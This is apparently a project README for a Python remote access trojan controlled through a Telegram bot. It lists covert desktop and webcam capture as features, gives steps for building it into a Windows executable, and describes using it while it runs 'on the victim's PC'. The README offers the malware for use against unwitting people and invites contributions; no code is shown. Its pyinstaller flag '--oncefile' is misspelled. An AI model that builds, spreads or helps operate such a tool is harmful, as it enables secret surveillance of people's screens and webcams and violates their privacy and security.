# TelegramRAT
This repository contains a Telegram bot with an embedded RAT virus written in Python.

## Features
- Get desktop screenshot
- Get webcam screenshot

## Installation
1. Clone this repository: ``git clone https://github.com/p10we/TelegramRAT.git``
2. Create a virtual environment and activate it: ``python -m venv venv``
3. Install the required dependencies: ``pip install -r requirements.txt``
4. Create a bot at [@BotFather](https://t.me/botfather) and copy the bot token
5. Replace ``TOKEN`` in the ``.env`` file with your bot token.
6. Start the bot: ``python app.py``

### Build EXE file

1. Install an additional library: ``pip install pyinstaller``
2. Compile main Python file to EXE file: ``pyinstaller --oncefile app.py``
3. Find the finished EXE file in the dist folder

### Usage

When the bot is running on the victim's PC, you can use the keyboard that appears after the /start command

### Contribution

We welcome contributions to this repository. If you have any suggestions or bug fixes, please feel free to create a pull request.

### License

This repository is licensed under the [MIT License](./LICENSE).

### Support

If you need help with the bot, please feel free to open an issue on this repository.
